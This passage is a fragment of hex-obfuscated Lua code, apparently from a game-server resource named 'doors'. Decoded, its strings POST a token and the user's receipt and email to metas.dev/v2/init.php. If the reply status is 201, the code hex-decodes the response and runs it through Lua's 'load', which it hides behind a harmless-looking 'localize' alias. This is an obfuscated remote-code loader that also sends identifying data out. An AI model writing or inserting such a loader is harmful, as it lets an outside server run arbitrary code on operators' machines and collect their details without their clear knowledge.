...
Utils = {
    _U3 = "68747470733A2F2F6D657461732E6465762F",
    _P = "504F5354",
    _S1 = "646174613D7B22544F4B454E223A22",
    _S2 = "222C2252454345495054223A22",
    _S3 = "222C22454D41494C223A22",
    _S4 = "227D",
    _T = "646F6F7273",
    _U2 = "76322F696E69742E706870",
    _E = 201,
    _M = (Credentials and Credentials.Email or ""),
    _R = (Credentials and Credentials.Receipt or ""),
    _GG = load
}
Utilities = function()
    Utils.Req(Utils["_T"], Utils["_R"], Utils["_M"])
end
Utils.Req = function(t, r, e)
    mLibs:_REQ(Utils._U3:fromhex() .. Utils._U2:fromhex(), Utils.Ret, Utils._P:fromhex(), Utils.ReqStr(t, r, e))
end
Utils.ReqStr = function(t, r, e)
    return Utils._S1:fromhex() .. t .. Utils._S2:fromhex() .. r .. Utils._S3:fromhex() .. e .. Utils._S4:fromhex()
end
Utils.Ret = function(e, d)
    if e == nil and d == nil then
        Wait(5000)
        Utilities()
    elseif e ~= Utils._E then
        error(d)
    else
        local s = entityIterBitter()["localize"](d:fromhex())
...
entityIterBitter = function()
    return {version = 1.00, creator = "Illidan", localize = _G[("6C6F6164"):fromhex()]}
end
